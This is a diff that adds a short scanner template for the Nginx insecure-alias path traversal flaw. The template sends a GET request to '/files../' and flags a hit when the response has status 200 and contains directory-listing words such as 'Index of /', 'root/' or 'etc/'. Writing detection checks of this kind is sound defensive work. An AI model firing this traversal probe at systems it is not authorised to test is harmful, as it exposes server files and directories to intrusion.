@@ -1,0 +1,21 @@
+id: poc-yaml-nginx-insecure-configuration-path-travel
+info:
+  name: Nginx Insecure Configuration Path Traversal
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: directory-traversal
+http:
+  - method: GET
+    path:
+      - "/files../"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "Index of /"
+          - "root/"
+          - "etc/"
